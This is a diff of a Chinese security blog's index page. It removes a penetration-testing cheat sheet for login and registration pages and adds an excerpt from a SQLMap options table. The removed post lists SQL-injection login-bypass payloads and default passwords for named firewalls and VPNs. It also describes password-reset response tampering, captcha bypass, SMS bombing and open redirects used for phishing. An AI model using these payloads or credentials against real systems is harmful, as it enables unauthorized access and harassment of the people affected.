@@ -288,157 +288,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sunyyer.com/2021/11/24/%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="云">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/11/24/%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url">未命名</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-11-24T20:57:23+08:00">
-                2021-11-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="登录注册页面常见技巧"><a href="#登录注册页面常见技巧" class="headerlink" title="登录注册页面常见技巧"></a>登录注册页面常见技巧</h1><h2 id="扫描器选用"><a href="#扫描器选用" class="headerlink" title="扫描器选用"></a>扫描器选用</h2><p>Nessus与AWVS</p>
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="常见万能密码绕过"><a href="#常见万能密码绕过" class="headerlink" title="常见万能密码绕过"></a>常见万能密码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="ASP-ASPX万能密码"><a href="#ASP-ASPX万能密码" class="headerlink" title="ASP ASPX万能密码"></a>ASP ASPX万能密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1：”or “a”=”a</span><br><span class="line">2： ‘)or(‘a’=’a</span><br><span class="line">3：or 1=1–</span><br><span class="line">4：’or 1=1–</span><br><span class="line">5：a’or’ 1=1–</span><br><span class="line">6：”or 1=1–</span><br><span class="line">7：’or’a’=’a</span><br><span class="line">8：”or”=”a’=’a</span><br><span class="line">9：’or”=’</span><br><span class="line">10：’or’=’or’</span><br><span class="line">11: 1 or ‘1’=’1’=1</span><br><span class="line">12: 1 or ‘1’=’1’ or 1=1</span><br><span class="line">13: ‘OR 1=1%00</span><br><span class="line">14: “or 1=1%00</span><br><span class="line">15: ‘xor</span><br><span class="line">16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”=’ （替换表名admin）</span><br><span class="line">密码 1</span><br><span class="line">17…admin’ or ‘a’=’a 密码随便</span><br></pre></td></tr></table></figure>
-<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘or 1=1/*</span><br><span class="line">User: something</span><br><span class="line">Pass: ’ OR ‘1’=’1</span><br></pre></td></tr></table></figure>
-<h3 id="JSP万能密码"><a href="#JSP万能密码" class="headerlink" title="JSP万能密码"></a>JSP万能密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1’or’1’=’1</span><br><span class="line">admin’ OR 1=1/*</span><br></pre></td></tr></table></figure>
-<h3 id="登录口SQL注入"><a href="#登录口SQL注入" class="headerlink" title="登录口SQL注入"></a>登录口SQL注入</h3><p>抓包后修改发包格式，盲注方式查看报错结果。一般是五大注入测试，也可配合sqlmap使用，详细参见SQL注入与SQLMAP。</p>
-<h2 id="用户名枚举、爆破弱口令"><a href="#用户名枚举、爆破弱口令" class="headerlink" title="用户名枚举、爆破弱口令"></a>用户名枚举、爆破弱口令</h2><p>在枚举用户名和密码后查看回显的数据，漏洞点在用户名错误与密码错误的回显报错不同，就可以通过枚举用户名来测试。</p>
-<p>弱口令爆破需要注意测试的时间间隔和字典的可用性，最好先判断受害者群体，如学生以学号为主，辅助以姓名生日。判断密码的最小值。</p>
-<p>一些网络设备的弱口令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure>
-
-<h2 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h2><p>这部分没什么技巧可言，在扫描时关注即可。</p>
-<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>短信云接收平台，不要用自己的手机号</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.pdflibr.com/</span><br><span class="line">http://www.smszk.com/</span><br></pre></td></tr></table></figure>
-
-<h3 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h3><p>在找回密码时，随意输入账户名和验证码，账户名如果是手机号直接改自己的手机号修改密码，或者返回的包中：</p>
-<p>返回包错误的回显为<code>&#123;&quot;status&quot;:0&#125;</code></p>
-<p>将返回包的东西换成<code>&#123;&quot;status&quot;:1&#125;</code></p>
-<h3 id="任意用户注册"><a href="#任意用户注册" class="headerlink" title="任意用户注册"></a>任意用户注册</h3><p>爆破注册页面的验证码，进行任意用户用户注册。抓包显示没有别的接口，只有验证码。</p>
-<h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p>抓包显示手机号直接明文，且没有经过任何防护，在抓包后不停地repate就可以。如果有限制，尝试在手机号后面加上一个空格、加号、换行符等特殊字符重新发送，如果可以在Burp中持续递增空格就行。</p>
-<h2 id="禁用JS脚本"><a href="#禁用JS脚本" class="headerlink" title="禁用JS脚本"></a>禁用JS脚本</h2><p>某些重定向或这权限丢失，在进入后台的一瞬间，重定向到登录页面，此时如果禁用JS，有机会进行一定权限的控制。</p>
-<h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p>制作钓鱼用，没什么可说的。</p>
-<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>内容比较杂，推荐一篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6103">常见未授权访问漏洞总结</a></p>
-<h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><h3 id="修改验证码校验对象"><a href="#修改验证码校验对象" class="headerlink" title="修改验证码校验对象"></a>修改验证码校验对象</h3><p>将A的修改密码验证码接收者改为B，这样A账号的验证码就会发到B的收集，B可以重置A的验证码，一般用在已知A用户的前提下。</p>
-<h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><ul>
-<li>万能验证码0000或9999</li>
-<li>验证码失效时间过长，纯数字或段字符直接爆破</li>
-<li>验证码直接在前端页面回显，抓返回包就能看到</li>
-<li>验证码不刷新，一码多次使用</li>
-<li>验证码识别，使用PKAV</li>
-<li>在包中直接删除cookie、直接删除验证码参数、修改response状态值<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>一定要根据抓包的内容巧妙渗透，一般存在登录页面可以测方面看看整个目录的情况，如果实在进不去尝试看看有没有其他的登录口这样，钻牛角尖不可取。</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://sunyyer.com/2021/11/24/%E4%BA%BA%E7%94%9F%E7%9A%84%E6%84%8F%E4%B9%89%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88%E5%91%A2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1794,6 +1643,218 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2021/03/29/%E4%B8%80%E6%AC%A1%E6%AF%94%E8%BE%83%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sunyyer.com/2021/01/19/SQLMap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="云">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/01/19/SQLMap/" itemprop="url">SQLMap</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-19T23:22:33+08:00">
+                2021-01-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
+                    <span itemprop="name">工具</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h1><h2 id="功能模块参数"><a href="#功能模块参数" class="headerlink" title="功能模块参数"></a>功能模块参数</h2><table>
+<thead>
+<tr>
+<th align="center">Target:At least one of these options has to be provided to define the target(s)</th>
+<th align="center">目标：至少为目标提供一个选项</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Request</td>
+<td align="center">请求：这些选项用于指定如何连接目标URL的方法</td>
+</tr>
+<tr>
+<td align="center">Optimization</td>
+<td align="center">优化：这些选项用来优化sqlmap的性能</td>
+</tr>
+<tr>
+<td align="center">Injection</td>
+<td align="center">注入：这些选项用于指定测试那些参数，提供注入payload和篡改脚本</td>
+</tr>
+<tr>
+<td align="center">Detection</td>
+<td align="center">侦测：这些选项用于侦测阶段的定制化</td>
+</tr>
+<tr>
+<td align="center">Techniques</td>
+<td align="center">技巧：这些选项用于调整特定sql注入技术的技巧</td>
+</tr>
+<tr>
+<td align="center">Enumeration</td>
+<td align="center">枚举：这些选项可用于枚举后端数据库管理系统信息、表里的数据接口，此外还可以运行你的sql语句</td>
+</tr>
+<tr>
+<td align="center">Brute force</td>
+<td align="center">暴力执行：这些选项用于暴力检查</td>
+</tr>
+<tr>
+<td align="center">User-defined function injection</td>
+<td align="center">用户定义注入函数:这些选项用于建立用户定义函数</td>
+</tr>
+<tr>
+<td align="center">File system access</td>
+<td align="center">访问文件系统：这些选项用于访问后端数据库管理系统的底层文件系统</td>
+</tr>
+<tr>
+<td align="center">Operating system access</td>
+<td align="center">操作系统连接：这些选项用于连接后端DBMS底层的os</td>
+</tr>
+<tr>
+<td align="center">Windows registry access</td>
+<td align="center">windows 注册表连接：这些选项用于连接后端DBMS的windows 注册表</td>
+</tr>
+<tr>
+<td align="center">General</td>
+<td align="center">通用：这些选项用于设置一些通用参数</td>
+</tr>
+</tbody></table>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/19/SQLMap/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
